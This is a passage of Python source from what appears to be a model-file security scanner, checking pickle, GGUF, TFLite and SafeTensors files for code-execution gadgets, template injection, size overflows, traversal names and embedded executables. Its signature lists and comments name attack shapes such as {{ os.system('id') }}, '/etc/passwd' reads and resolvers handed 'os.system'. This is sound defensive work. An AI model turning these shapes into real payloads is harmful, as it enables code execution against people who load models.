    except Exception:                                    # noqa: BLE001
        return None
    return sorted(names) or None


def _embedded_pickle_denied_globals(data: bytes) -> list[str]:
    """Denied callables hiding in a pickle stream carried as a bytes literal.

    `numpy.load(BytesIO(<pickle>))` is the published shape. numpy.load is on
    nobody's deny list, the outer stream contains no URL or shell string, and
    the payload only exists once the inner bytes are themselves unpickled.
    Any loader handed those bytes will read them, so this scanner reads them
    too, one level down.

    Deliberately narrow: only inner streams referencing an already-denied
    callable are reported. A nested pickle on its own is unusual rather than
    dangerous, and reporting merely unusual structure is how a scanner starts
    flagging real models.
    """
    found: list[str] = []
    try:
        ops = list(pickletools.genops(io.BytesIO(data)))
    except Exception:                                    # noqa: BLE001
        return found
    for op, arg, _pos in ops:
        if op.name not in ("SHORT_BINBYTES", "BINBYTES", "BINBYTES8"):
            continue
        nested = _nested_pickle_globals(arg if isinstance(arg, bytes) else b"")
        for name in nested or ():
            if _classify_pickle_global(name) == "denied":
                found.append(name)
    return sorted(set(found))


def _triage_unknown_pickle_call(
    call: PickleResolvedCall | None,
) -> tuple[Severity, str] | None:
    """Re-triage one unknown global against the argument-level evidence the
    opcode walk resolved for it, returning ``(severity, reason)`` or None to
    leave it in the INFO bucket.

    Takes only the resolved call, not the global's name: after measuring the
    module-identity tier against real pickles (see the note above), every
    surviving signal reads the arguments and nothing reads the callable's
    name. That is the intended shape -- a verdict derived from the name is a
    deny list, and a deny list is what the bypass gadgets are designed to
    walk past.

    Ordered strongest evidence first; the first match wins.
    """
    if call is None:
        # Referenced but never invoked, or invoked with arguments that could
        # not be resolved to literals. No evidence to act on -- the scanner
        # does not guess at values it cannot verify.
        return None

    # A code object carries its source path in co_filename, so the path signal
    # says nothing about this call. Every other signal still applies.
    is_code_builder = call.ref in _PICKLE_CODE_OBJECT_BUILDERS
    takes_pattern = call.ref in _PICKLE_PATTERN_ARG_CALLABLES

    if call.partial_texts:
        # Only some arguments resolved. The text signals below still apply --
        # a literal is a literal wherever it sat in the argument list -- but
        # the (host, port) check below is skipped, because it reasons about
        # tuple *structure* that this call, by definition, does not have.
        texts = list(call.partial_texts)
        arguments: Any = ()
    else:
        arguments = (call.args, call.kwargs or {})
        texts = [
            text
            for text in (_pickle_arg_text(v) for v in _iter_pickle_arg_values(arguments))
            if text is not None
        ]

    for text in texts:
        if takes_pattern:
            # The argument is a regular expression by the callable's contract.
            continue
        if _PICKLE_ARG_URL_RE.search(text):
            return (Severity.HIGH, "invoked with a URL argument")
        if _PICKLE_ARG_SHELL_RE.search(text) or (text.startswith("/") and " " in text.strip()):
            return (Severity.HIGH, "invoked with a shell-command-shaped argument")

    if next(_iter_pickle_host_port_pairs(arguments), None) is not None:
        return (Severity.HIGH, "invoked with a network endpoint (host, port) argument")


    for text in texts:
        # A literal string that *names* something denied, handed to some other
        # callable. This is dynamic resolution in its general form, and the
        # check needs no list of its own: it re-runs the existing
        # classification over the argument instead of over a resolved global.
        #
        # It is the answer to automatically-discovered gadgets. PickleCloak
        # mines the stdlib for dotted-name resolvers and finds ones nobody has
        # listed -- `logging.config._resolve`, `unittest.mock._dot_lookup`,
        # `xmlrpc.server.resolve_dotted_attribute`,
        # `sympy.utilities.source.get_class` -- but every one of them is handed
        # the same `'os.system'`, because the *resolver* is interchangeable and
        # the *target* is not. Keying on the target rather than the resolver is
        # what stops this being a list-maintenance race.
        if _classify_pickle_global(text) == "denied" or _is_denied_pickle_module(text):
            return (
                Severity.HIGH,
                f"is invoked with {text!r}, which names a callable this scanner denies -- "
                f"the shape of a dynamic-resolution gadget, where an innocuous-looking "
                f"resolver is handed the dangerous target as data",
            )
        # The same test, read through Python's grammar rather than off the
        # bare string: an argument that is *source code* naming a denied
        # callable. Same classifier, same reasoning, wider aperture -- see
        # `_iter_pickle_source_targets`.
        source_target = _pickle_source_denied_target(text)
        if source_target is not None:
            return (
                Severity.HIGH,
                f"is invoked with {_PICKLE_ARG_REPR.repr(text)}, which is Python source "
                f"resolving {source_target!r}, a callable this scanner denies -- the shape "
                f"of an eval-family gadget, where the evaluator is interchangeable and only "
                f"the target it is handed matters",
            )
        if text in _PICKLE_DENIED_ATTR_NAMES and not is_code_builder:
            return (
                Severity.MEDIUM,
                f"invoked with {text!r}, the attribute name of a known code-execution "
                f"callable -- the shape of a getattr/attrgetter chain resolving it dynamically",
            )

    # The three-link gadget chain, keyed purely on the shape of the call graph
    # and on no name anywhere in it:
    #
    #   1. some call produces an object,
    #   2. this call consumes that object together with a literal identifier,
    #   3. and this call's own result is then *invoked*.
    #
    # That is dynamic member resolution followed by a call: build an object,
    # name a member on it with a string, invoke what comes back. The dangerous
    # attribute never appears in the opcode stream, so the global walk has
    # nothing to resolve and no list can help.
    #
    # All three links are required, and link 3 is what makes it safe. Links 1
    # and 2 alone are not rare enough: a legitimate `__reduce__` returning
    # `(Outer, (inner_obj, 'field_name'))` has exactly that shape and is a
    # plausible thing for a real library to do -- it was a measured false
    # positive on a hand-built benign pickle before link 3 was added. What has
    # no benign counterpart is the third link. Pickle's own protocol always
    # names the callable operand of a REDUCE via GLOBAL/STACK_GLOBAL; a stream
    # that instead calls a value it computed at load time is doing something
    # the serialization format never needs to do.
    #
    # Neither end of the chain can be listed: PickleCloak's resolvers
    # (`unittest.mock._dot_lookup`, `xmlrpc.server.resolve_dotted_attribute`,
    # `lib2to3.fixer_util.attr_chain`) are mined automatically, and the targets
    # (`save`, `read_file`, `to_string`, `_loads`) are ordinary method names
    # that are dangerous only on the specific class just constructed. The edge
    # between them is the only stable thing to key on.
    #
    # MEDIUM, matching the getattr/attrgetter tier above: this establishes that
    # a member is being resolved dynamically and then called, not what it
    # resolves to.
    # Code-object builders are exempt, and they are the counterexample this
    # comment worried about. `dill._create_function(_create_code(...),
    # globals, '__name__', ...)` has all three links by construction: it
    # consumes a code object, is handed the function's own name as a literal,
    # and the function it returns is then called. Measured on SafePickle's
    # benign half, that shape alone promoted 80 of 644 real models.
    if call.chained_from and call.result_invoked and not is_code_builder:
        identifiers = [t for t in texts if t.isidentifier()]
        if identifiers:
            return (
                Severity.MEDIUM,
                f"consumes the result of {call.chained_from[0]}(), is handed "
                f"{identifiers[0]!r} as a literal, and its own result is then invoked -- the "
                f"shape of a dynamic member lookup on a freshly constructed object, which "
                f"keeps the resolved attribute out of the opcode stream entirely",
            )

    for text in texts:
        if _PICKLE_ARG_PATH_RE.search(text) and not is_code_builder:
            # Weak on its own -- `pathlib.PurePosixPath('/home/u/model.bin')`
            # looks identical to `linecache.getline('/etc/passwd', 1)` at the
            # opcode level, and a file read is not code execution either way.
            # LOW is enough to clear the INFO tier that gets suppressed
            # wholesale without overstating what the evidence shows.
            #
            # Deliberately still anchored at the start of the string. Relaxing
            # it to "any whitespace-separated token is a path" was tried, to
            # reach `getoutput('touch /tmp/liut')` where the path sits second;
            # it promoted three more corpus files and false-positived on
            # ordinary prose that mentions a path ("weights were loaded from
            # /opt/models/base.bin"). The anchor is doing real work: a string
            # that *begins* with a path is a path, while a string that merely
            # contains one is usually a sentence. Separating the two needs a
            # judgement about whether token 0 is a command name, which is a
            # list of command names by another route.
            return (Severity.LOW, "invoked with an absolute or traversing filesystem path argument")

    return None


# Confidence and message lead per escalated tier, in emission order. Both are
# a function of the severity alone, so they live here rather than being
# returned alongside it and carried around. The tiers span "an unrecognized
# callable is being handed a shell command" and "...handed a file path"; one
# message for both would overstate at one end.
_PICKLE_UNKNOWN_TIERS: dict[Severity, tuple[float, str]] = {
    Severity.HIGH: (0.70, "Pickle file invokes unrecognized global(s) with arguments indicating "
                          "command execution, network access, or data exfiltration"),
    Severity.MEDIUM: (0.50, "Pickle file invokes unrecognized global(s) with arguments that name a "
                            "code-execution callable for dynamic resolution"),
    Severity.LOW: (0.40, "Pickle file invokes unrecognized global(s) with filesystem path arguments"),
}


# Code-execution/sandbox-escape constructs that distinguish a real SSTI
# payload from ordinary Jinja2 variable substitution inside a chat_template.
# Every legitimate chat-tuned model's template is full of "{{ }}" -- that's
# just how Jinja2 spells a variable reference -- so presence of "{{" alone
# is not a signal. What distinguishes a payload is Python object
# introspection, sandbox escape, or a shell-out primitive appearing inside
# the template.
_GGUF_CHAT_TEMPLATE_SSTI_SIGNATURES: tuple[str, ...] = (
    "__globals__", "__class__", "__mro__", "__subclasses__",
    "__builtins__", ".__init__.__globals__",
    "os.", "subprocess.", "popen",
)

# The only parts of a Jinja2 template that execute: {{ expression }} and
# {% statement %}. Prose outside these delimiters (and inside {# comments #})
# is rendered verbatim, so signature-matching there measures vocabulary, not
# behavior.
_GGUF_JINJA_BLOCK_RE = re.compile(r"\{\{.*?\}\}|\{%.*?%\}", re.DOTALL)

# String literals inside a Jinja block are data, not code: {{ 'scenarios.' }}
# renders the text, it does not touch `os`. Real templates embed instructions
# this way (measured: unsloth's DeepSeek-V4 template carries its system-prompt
# prose inside a {{ '...' }} literal), so literals are blanked before the
# signature match. {{ os.system('id') }} still matches via `os.` in code
# position; {{ ''.__class__ }} still matches via `__class__`.
_GGUF_JINJA_STRING_RE = re.compile(r"'(?:[^'\\]|\\.)*'|\"(?:[^\"\\]|\\.)*\"")

# ── GGUF metadata parsing ───────────────────────────────────────────
#
# Structure-aware KV parsing per the GGUF binary spec, instead of decoding
# the raw file bytes and substring-matching across everything (which used to
# match tensor names/binary weight data as readily as actual metadata, and
# couldn't distinguish "this string is a metadata *value*" from "this byte
# sequence just happens to appear somewhere in the file"). Only string and
# string-array typed KV entries are materialized; every other type is
# skipped by its known fixed/computed size so the offset stays correct
# without needing to store values we don't check.

GGUF_MAGIC = b"GGUF"

# GGML is GGUF's predecessor and is still shipped: whisper.cpp publishes its
# models in it, often under a .gguf name. Stored little-endian, its magic
# 0x67676d6c reads as b"lmgg" on disk. Calling one of those "corrupted" is
# wrong twice over, since the file is neither corrupt nor GGUF, and a hub
# sweep found this was 10 of 17 actionable findings across 1,974 real files.
GGML_MAGICS = (b"lmgg", b"fmgg", b"tjgg")   # ggml, ggmf, ggjt

GGUF_METADATA_SCAN_BYTES = 10_000_000

# Standard GGUF `general.*` keys documented as free-text/descriptive (per the
# GGUF KV spec) -- exempt from the dangerous-substring content check below,
# since ordinary prose in a description/author/license/tags field routinely
# contains words like "subprocess" or "class" without being executable.
_GGUF_FREETEXT_KEYS = frozenset({
    "general.name", "general.description", "general.author",
    "general.organization", "general.license", "general.license.name",
    "general.url", "general.doi", "general.repo_url", "general.tags",
    "general.languages", "general.datasets", "general.finetune",
    "general.basename", "general.quantized_by", "general.size_label",
    "general.source.url", "general.source.doi", "general.source.repo_url",
    # tokenizer.ggml.tokens is the model's vocabulary: a list of arbitrary
    # substrings harvested from training text, not metadata anyone wrote. A
    # code-trained vocab necessarily contains tokens like "<class", "exec("
    # and "__import__" (measured: unsloth's DeepSeek-V4 GGUFs trip three of
    # the patterns below on vocab alone). Vocabulary is data, and no code
    # path in a GGUF runtime executes it.
    #
    # The same argument covers the other tokenizer tables. merges is the BPE
    # merge list, built from the same training text and equally certain to
    # contain arbitrary substrings. A 2,456-file hub sweep found unsloth's
    # gemma GGUFs tripping the "subprocess" pattern on merges alone, which is
    # this exact false positive recurring on a different key. token_type and
    # scores are numeric, and the chat template keeps its own dedicated check
    # (MFV-GGUF-003), which looks for execution constructs rather than
    # substrings.
    "tokenizer.ggml.tokens",
    "tokenizer.ggml.merges",
    "tokenizer.ggml.token_type",
    "tokenizer.ggml.scores",
})

_GGUF_TYPE_STRING = 8
_GGUF_TYPE_ARRAY = 9
_GGUF_FIXED_TYPE_SIZES: dict[int, int] = {
    0: 1,  # UINT8
    1: 1,  # INT8
    2: 2,  # UINT16
    3: 2,  # INT16
    4: 4,  # UINT32
    5: 4,  # INT32
    6: 4,  # FLOAT32
    7: 1,  # BOOL
    10: 8,  # UINT64
    11: 8,  # INT64
    12: 8,  # FLOAT64
}

# ggml type id -> (block_size, type_size), from ggml's public type traits.
# Needed to replay nbytes arithmetic the way llama.cpp computes it, which is
# where the integer-overflow CVEs live (CVE-2026-33298's ne = [1024, 1024,
# 4398046511105, 1] wraps the u64 product). Unknown ids simply skip the
# bounds replay; an implausibly large id is itself reported.
_GGML_TYPE_TRAITS: dict[int, tuple[int, int]] = {
    0: (1, 4),      # F32
    1: (1, 2),      # F16
    2: (32, 18),    # Q4_0
    3: (32, 20),    # Q4_1
    6: (32, 22),    # Q5_0
    7: (32, 24),    # Q5_1
    8: (32, 34),    # Q8_0
    9: (32, 40),    # Q8_1
    10: (256, 84),  # Q2_K
    11: (256, 110),  # Q3_K
    12: (256, 144),  # Q4_K
    13: (256, 176),  # Q5_K
    14: (256, 210),  # Q6_K
    15: (256, 292),  # Q8_K
    16: (256, 66),  # IQ2_XXS
    17: (256, 74),  # IQ2_XS
    18: (256, 98),  # IQ3_XXS
    19: (256, 50),  # IQ1_S
    20: (32, 18),   # IQ4_NL
    21: (256, 110),  # IQ3_S
    22: (256, 82),  # IQ2_S
    23: (256, 136),  # IQ4_XS
    24: (1, 1),     # I8
    25: (1, 2),     # I16
    26: (1, 4),     # I32
    27: (1, 8),     # I64
    28: (1, 8),     # F64
    29: (256, 56),  # IQ1_M
    30: (1, 2),     # BF16
    34: (256, 54),  # TQ1_0
    35: (256, 66),  # TQ2_0
    39: (256, 82),  # IQ2_M
}

_GGUF_MAX_DIMS = 4          # GGML_MAX_DIMS
_GGUF_MAX_PLAUSIBLE_TYPE = 64
_GGUF_MAX_KEY_BYTES = 1 << 20
_U64 = 1 << 64


# ── Embedded executable detection ────────────────────────────────
#
# A model file that *contains* a loadable binary is essentially always
# malicious. The magics are 2-4 bytes, so matching them bare turns every
# large weight blob into a false positive ('MZ' appears by chance roughly
# once per 64K of random data). Each check below is therefore structural:
# the second stage has to parse, which random tensor bytes do not survive.

_MACHO_MAGICS = (b"\xfe\xed\xfa\xce", b"\xfe\xed\xfa\xcf",
                 b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe")
_MACHO_CPUTYPES = {7, 12, 0x01000007, 0x0100000C}  # x86, arm, x86_64, arm64
_ELF_MACHINES = {0x03, 0x08, 0x14, 0x15, 0x16, 0x28, 0x2B, 0x3E, 0xB7, 0xF3}


def _find_embedded_executables(data: bytes) -> list[str]:
    """Structural scan for PE/ELF/Mach-O binaries anywhere in the buffer.

    Returns one description per finding, capped. Runs on model bytes and on
    archive members alike; every stage is bounded, so worst case on a big
    file is a handful of candidate validations.
    """
    hits: list[str] = []

    pos = data.find(b"MZ")
    while pos != -1 and len(hits) < 10:
        # PE: e_lfanew at 0x3C points at a "PE\0\0" signature.
        if pos + 0x40 <= len(data):
            (lfanew,) = struct.unpack_from("<I", data, pos + 0x3C)
            if 0 < lfanew < 1 << 20 and data[pos + lfanew:pos + lfanew + 4] == b"PE\0\0":
                hits.append(f"PE/Windows executable at offset {pos}")
        pos = data.find(b"MZ", pos + 1)

    pos = data.find(b"\x7fELF")
    while pos != -1 and len(hits) < 20:
        if pos + 20 <= len(data):
            ident = data[pos + 4:pos + 16]
            (e_type,) = struct.unpack_from("<H", data, pos + 16)
            (e_machine,) = struct.unpack_from("<H", data, pos + 18)
            if (
                ident[0] in (1, 2)          # EI_CLASS: 32/64-bit
                and ident[1] in (1, 2)      # EI_DATA: little/big endian
                and ident[2] == 1           # EI_VERSION
                and e_type in (2, 3)        # ET_EXEC / ET_DYN
                and e_machine in _ELF_MACHINES
            ):
                hits.append(f"ELF executable at offset {pos}")
        pos = data.find(b"\x7fELF", pos + 1)

    for magic in _MACHO_MAGICS:
        pos = data.find(magic)
        while pos != -1 and len(hits) < 30:
            if pos + 12 <= len(data):
                (cputype,) = struct.unpack_from("<I", data, pos + 4)
                (_cpusubtype, filetype) = struct.unpack_from("<II", data, pos + 8)
                if magic in (b"\xce\xfa\xed\xfe", b"\xcf\xfa\xed\xfe"):
                    # byte-swapped variants read big-endian
                    (cputype,) = struct.unpack_from(">I", data, pos + 4)
                    (_cpusubtype, filetype) = struct.unpack_from(">II", data, pos + 8)
                if cputype in _MACHO_CPUTYPES and 1 <= filetype <= 12:
                    hits.append(f"Mach-O executable at offset {pos}")
            pos = data.find(magic, pos + 1)

    return hits



#
# ── TFLite layout arithmetic ─────────────────────────────────────
#
# TFLite is FlatBuffers: no code executes on load, but the *parser* computes
# tensor sizes from attacker-chosen dimensions, and CVE-2026-42627 (ArmNN,
# published 2026-05) is exactly that: TensorShape::GetNumElements()
# multiplies dimensions in 32-bit without overflow detection, understates
# the allocation, and BatchToSpaceNd reads past it during Optimize(). The
# check is the same arithmetic-invariant shape as the GGUF/SafeTensors
# passes: replay the dimension product in ints that do not wrap and flag
# anything a 32-bit loader cannot hold.
#
# FlatBuffers layout used here (no schema needed):
#   buffer[0:4]   u32 offset to the root table
#   buffer[4:8]   "TFL3" file identifier
#   table:        int32 soffset back to its vtable; vtable is
#                 u16 vtable_len, u16 table_len, u16 offset per field id
#   vector:       u32 offset to it, then u32 count, then elements
# Field ids (TFLite schema, stable since 2017): Model.subgraphs = 2,
# SubGraph.tensors = 1, Tensor.shape = 1, Tensor.type = 2.

_TFLITE_MAGIC = b"TFL3"
_TFLITE_MODEL_SUBGRAPHS = 2
_TFLITE_SUBGRAPH_TENSORS = 1
_TFLITE_TENSOR_SHAPE = 1

_TFLITE_MAX_DIMS_PRODUCT_32 = 1 << 32


def _fb_table_field(data: bytes, table: int, field_id: int) -> int | None:
    """Absolute offset of a table field's inline value, or None if absent
    (FlatBuffers omits default-valued fields)."""
    if table < 4 or table + 4 > len(data):
        return None
    (soffset,) = struct.unpack_from("<i", data, table)
    vtable = table - soffset
    if vtable < 0 or vtable + 4 > len(data):
        return None
    vtable_len, _table_len = struct.unpack_from("<HH", data, vtable)
    slot = 4 + 2 * field_id
    if slot + 2 > vtable_len or vtable + slot + 2 > len(data):
        return None
    (rel,) = struct.unpack_from("<H", data, vtable + slot)
    if rel == 0:
        return None
    return table + rel


def _fb_indirect(data: bytes, at: int | None) -> int | None:
    """Follow a u32 relative offset to its target's absolute offset."""
    if at is None or at + 4 > len(data):
        return None
    (rel,) = struct.unpack_from("<I", data, at)
    target = at + rel
    return target if 0 <= target <= len(data) else None


def _fb_int_vector(data: bytes, vec: int | None) -> list[int] | None:
    """Read a vector of int32 at absolute offset `vec`."""
    if vec is None or vec + 4 > len(data):
        return None
    (count,) = struct.unpack_from("<I", data, vec)
    if count > 8:  # tensor rank is small; GGML_MAX_DIMS is 4
        return None
    if vec + 4 + 4 * count > len(data):
        return None
    return list(struct.unpack_from(f"<{count}i", data, vec + 4)) if count else []


def _check_tflite_layout(data: bytes) -> list[str]:
    """Replay every tensor's dimension product in a TFLite model and report
    shapes a 32-bit loader cannot allocate."""
    problems: list[str] = []
    if len(data) < 8:
        return problems
    (root_rel,) = struct.unpack_from("<I", data, 0)
    root = _fb_indirect(data, 0) if root_rel else None
    if root is None:
        return ["root table offset points outside the file"]
    subgraphs_vec = _fb_indirect(data, _fb_table_field(data, root, _TFLITE_MODEL_SUBGRAPHS))
    if subgraphs_vec is None or subgraphs_vec + 4 > len(data):
        return problems  # no subgraphs: unusual, but nothing to replay
    (n_subgraphs,) = struct.unpack_from("<I", data, subgraphs_vec)
    if n_subgraphs > 4096:
        problems.append(f"{n_subgraphs} subgraphs (implausible)")
        return problems
    for sg in range(n_subgraphs):
        subgraph = _fb_indirect(data, subgraphs_vec + 4 + 4 * sg)
        if subgraph is None:
            continue
        tensors_vec = _fb_indirect(data, _fb_table_field(data, subgraph, _TFLITE_SUBGRAPH_TENSORS))
        if tensors_vec is None or tensors_vec + 4 > len(data):
            continue
        (n_tensors,) = struct.unpack_from("<I", data, tensors_vec)
        if n_tensors > (len(data) // 4):
            problems.append(
                f"subgraph {sg} claims {n_tensors} tensors in a {len(data)}-byte file"
            )
            return problems
        for t in range(n_tensors):
            tensor = _fb_indirect(data, tensors_vec + 4 + 4 * t)
            if tensor is None:
                continue
            shape = _fb_int_vector(data, _fb_indirect(
                data, _fb_table_field(data, tensor, _TFLITE_TENSOR_SHAPE)))
            if shape is None or not shape:
                continue
            if any(d < 0 for d in shape):
                problems.append(f"tensor {t} of subgraph {sg} has a negative dimension")
                continue
            elements = 1
            for d in shape:
                elements *= d
                if elements >= _TFLITE_MAX_DIMS_PRODUCT_32:
                    problems.append(
                        f"tensor {t} of subgraph {sg} has {elements} elements: "
                        f"a 32-bit loader's dimension product wraps "
                        f"(CVE-2026-42627 shape)"
                    )
                    break
    return problems


_SAFETENSORS_DTYPE_SIZES: dict[str, int] = {

    "F64": 8, "F32": 4, "F16": 2, "BF16": 2,
    "I64": 8, "I32": 4, "I16": 2, "I8": 1,
    "U64": 8, "U32": 4, "U16": 2, "U8": 1,
    "BOOL": 1, "F8_E4M3": 1, "F8_E5M2": 1, "F8_E8M0": 1,
}

# A single tensor larger than 4GB is the integer-overflow shape in C-side
# loaders; aggregate sizes past the file are the OOB
# shape (its MFV014). Both are replayed here as arithmetic, not thresholds.
_SAFETENSORS_MAX_TENSOR_BYTES = 1 << 32


def _unsafe_name_reason(name: str) -> str | None:
    """Why a tensor or member name is not safe to use as a filename.

    Names inside a model container look inert, but plenty of real tooling
    turns them into paths: shard converters, `save_pretrained` round trips,
    and anything that materialises tensors individually. A name carrying a
    traversal segment, an absolute path or a control character is aimed at
    that behaviour, and it is not something a training run produces by
    accident. Published bypass proofs of concept ship exactly these five
    shapes for SafeTensors alone.
    """
    if not isinstance(name, str) or not name:
        return None
    if "\x00" in name:
        return "embedded NUL byte"
    if "\r" in name or "\n" in name:
        return "embedded newline, which can forge a record boundary"
    normalised = name.replace("\\", "/")
    parts = normalised.split("/")
    if ".." in parts:
        return "parent-directory traversal segment"
    if normalised.startswith("/"):
        return "absolute path"
    if len(name) > 1 and name[1] == ":" and name[0].isalpha():
        return "Windows drive-absolute path"
    return None


def _check_safetensors_layout(header: object, data_section_len: int) -> list[str]:
    """Replay a SafeTensors header's size arithmetic against the file.

    The header is attacker-chosen JSON; loaders allocate and memcpy from it.
    The spec itself requires offsets to be ordered and non-overlapping, so a
    file breaking that is malformed by its own contract, and safetensors-rs
    refuses it -- which is precisely why it must not sail through here.
    """
    problems: list[str] = []
    if not isinstance(header, dict):
        return problems
    spans: list[tuple[int, int, str]] = []
    for name, entry in header.items():
        reason = _unsafe_name_reason(name)
        if reason is not None:
            problems.append(f"tensor name {name!r} carries a {reason}")
        if name == "__metadata__" or not isinstance(entry, dict):
            continue
        offsets = entry.get("data_offsets")
        if (
            not isinstance(offsets, list) or len(offsets) != 2
            or not all(isinstance(o, int) and o >= 0 for o in offsets)
        ):
            problems.append(f"tensor {name!r} has malformed data_offsets")
            continue
        start, end = offsets
        if end < start:
            problems.append(f"tensor {name!r} has end before start in data_offsets")
            continue
        span = end - start
        shape = entry.get("shape")
        dtype = entry.get("dtype")
        dtype_size = _SAFETENSORS_DTYPE_SIZES.get(dtype) if isinstance(dtype, str) else None
        if (
            dtype_size is not None
            and isinstance(shape, list)
            and all(isinstance(d, int) and d >= 0 for d in shape)
        ):
            elements = 1
            for d in shape:
                elements *= d
            if elements * dtype_size != span:
                problems.append(
                    f"tensor {name!r}: shape x dtype = {elements * dtype_size} bytes "
                    f"but its span is {span}"
                )
        if span > _SAFETENSORS_MAX_TENSOR_BYTES:
            problems.append(
                f"tensor {name!r} is {span} bytes (>4GB, integer-overflow shape "
                f"in C loaders)"
            )
        if end > data_section_len:
            problems.append(
                f"tensor {name!r} ends at {end}, past the {data_section_len}-byte "
                f"data section"
            )
        spans.append((start, end, name))
    spans.sort()
    # spans[1:] is one shorter by construction, so the pairing is
    # deliberately ragged: strict=False.
    for (_prev_start, prev_end, prev_name), (start, _end, name) in zip(
            spans, spans[1:], strict=False):
        if start < prev_end:
            problems.append(
                f"tensors {prev_name!r} and {name!r} overlap in the data section"
            )
    return problems


def _check_gguf_layout(data: bytes) -> list[str]:
    """Replay the GGUF container's arithmetic and report every inconsistency.

    llama.cpp allocates and reads based on these counts, lengths, dimensions
    and offsets, computed in u64. A file whose numbers do not fit the file
    (or fit only by wrapping u64) is a parser exploit, not a corrupt model:
    CVE-2025-53630 (count overflow to OOB), CVE-2026-27940 (underallocate,
    then fread past the buffer) and CVE-2026-33298 (nbytes wraps, defeating
    size validation) are all this shape. Computed in Python ints, which do
    not wrap; anything exceeding u64 is reported as the wrap shape.
    """
    problems: list[str] = []
    file_size = len(data)
    if file_size < 24:
        return problems  # too small to hold a header; magic check owns this
    version, tensor_count, kv_count = struct.unpack_from("<IQQ", data, 4)
    if version not in (1, 2, 3):
        problems.append(f"GGUF version {version} (spec defines 1-3)")
    # Every KV entry costs at least 8 (length) + 4 (type) bytes; every tensor
    # info at least 8 (name length) + 4 (n_dims) + 4 (type) + 8 (offset).
    # A count the file cannot pay for is a heap-overflow setup.
    if kv_count * 12 > file_size:
        problems.append(
            f"kv_count {kv_count} cannot fit in {file_size} bytes "
            f"(min 12 bytes/entry)"
        )
    if tensor_count * 24 > file_size:
        problems.append(
            f"tensor_count {tensor_count} cannot fit in {file_size} bytes "
            f"(min 24 bytes/info)"
        )

    offset = 24
    try:
        for i in range(min(kv_count, file_size // 12 + 1)):
            (key_len,) = struct.unpack_from("<Q", data, offset)
            offset += 8
            if key_len > _GGUF_MAX_KEY_BYTES:
                problems.append(f"KV key length {key_len} bytes (buffer-overflow shape)")
                return problems
            if offset + key_len + 4 > file_size:
                problems.append(f"KV entry {i} extends past end of file")
                return problems
            offset += key_len
            (value_type,) = struct.unpack_from("<I", data, offset)
            offset += 4
            if value_type == _GGUF_TYPE_STRING:
                (vlen,) = struct.unpack_from("<Q", data, offset)
                offset += 8
                if offset + vlen > file_size:
                    problems.append(f"KV string value {i} extends past end of file")
                    return problems
                offset += vlen
            elif value_type == _GGUF_TYPE_ARRAY:
                (elem_type,) = struct.unpack_from("<I", data, offset)
                (count,) = struct.unpack_from("<Q", data, offset + 4)
                offset += 12
                if elem_type == _GGUF_TYPE_STRING:
                    truncated = False
                    for _ in range(min(count, file_size // 8 + 1)):
                        (slen,) = struct.unpack_from("<Q", data, offset)
                        offset += 8
                        if offset + slen > file_size:
                            problems.append(f"KV string array {i} extends past end of file")
                            truncated = True
                            break
                        offset += slen
                    if truncated:
                        return problems
                else:
                    elem_size = _GGUF_FIXED_TYPE_SIZES.get(elem_type)
                    if elem_size is None:
                        problems.append(f"KV array {i} has unknown element type {elem_type}")
                        return problems
                    if offset + count * elem_size > file_size:
                        problems.append(
                            f"KV array {i} ({count} x {elem_size}B) extends past end of file"
                        )
                        return problems
                    offset += count * elem_size
            else:
                size = _GGUF_FIXED_TYPE_SIZES.get(value_type)
                if size is None:
                    problems.append(f"KV entry {i} has unknown value type {value_type}")
                    return problems
                offset += size
    except (struct.error, IndexError):
        problems.append("KV section truncated before kv_count entries")
        return problems

    try:
        for i in range(min(tensor_count, file_size // 24 + 1)):
            (name_len,) = struct.unpack_from("<Q", data, offset)
            if name_len > _GGUF_MAX_KEY_BYTES:
                problems.append(f"tensor {i} name length {name_len} bytes")
                return problems
            try:
                tensor_name = data[offset + 8:offset + 8 + name_len].decode(
                    "utf-8", "replace")
            except (ValueError, IndexError):
                tensor_name = ""
            reason = _unsafe_name_reason(tensor_name)
            if reason is not None:
                problems.append(
                    f"tensor {i} name {tensor_name!r} carries a {reason}")
            if offset + 8 + name_len + 16 > file_size:
                problems.append(f"tensor info {i} extends past end of file")
                return problems
            offset += 8 + name_len
            (n_dims,) = struct.unpack_from("<I", data, offset)
            offset += 4
            if n_dims < 1 or n_dims > _GGUF_MAX_DIMS:
                problems.append(f"tensor {i} has {n_dims} dimensions (GGML_MAX_DIMS is 4)")
                return problems
            if offset + 8 * n_dims + 12 > file_size:
                problems.append(f"tensor info {i} extends past end of file")
                return problems
            dims = struct.unpack_from(f"<{n_dims}Q", data, offset)
            offset += 8 * n_dims
            (type_id,) = struct.unpack_from("<I", data, offset)
            offset += 4
            (tensor_offset,) = struct.unpack_from("<Q", data, offset)
            offset += 8
            if type_id >= _GGUF_MAX_PLAUSIBLE_TYPE:
                problems.append(f"tensor {i} has implausible ggml type id {type_id}")
                continue
            elements = 1
            wrapped = False
            for dim in dims:
                elements *= dim
                if elements >= _U64:
                    problems.append(
                        f"tensor {i} dimensions wrap u64 (CVE-2026-33298 shape)"
                    )
                    wrapped = True
                    break
            traits = _GGML_TYPE_TRAITS.get(type_id)
            if traits is None or wrapped:
                continue
            block, type_size = traits
            nbytes = (dims[0] // block) * type_size if block > 1 else elements * type_size
            if block > 1:
                for dim in dims[1:]:
                    nbytes *= dim
            if nbytes >= _U64:
                problems.append(f"tensor {i} byte size wraps u64")
                continue
            # Tensor data starts after ALL tensor infos, aligned, so the true
            # end is at least this large: a file failing even the base-less
            # check cannot hold the tensor under any alignment.
            if tensor_offset + nbytes > file_size:
                problems.append(
                    f"tensor {i} (offset {tensor_offset} + {nbytes} bytes) "
                    f"overruns the {file_size}-byte file"
                )
    except (struct.error, IndexError):
        problems.append("tensor info section truncated before tensor_count entries")
    return problems


def _read_gguf_string(data: bytes, offset: int) -> tuple[str, int]:
    (length,) = struct.unpack_from("<Q", data, offset)
    offset += 8
    raw = data[offset:offset + length]
    return raw.decode("utf-8", errors="replace"), offset + length


def _read_gguf_value(data: bytes, offset: int, value_type: int) -> tuple[Any, int]:
    """Read a GGUF value, returning (value, new_offset).

    Only STRING and ARRAY-of-STRING are materialized (all the security
    checks below need); every other type is skipped by size and returned as
    None.
    """
    if value_type == _GGUF_TYPE_STRING:
        return _read_gguf_string(data, offset)
    if value_type == _GGUF_TYPE_ARRAY:
        (elem_type,) = struct.unpack_from("<I", data, offset)
        offset += 4
        (count,) = struct.unpack_from("<Q", data, offset)
        offset += 8
        if elem_type == _GGUF_TYPE_STRING:
            values: list[str] = []
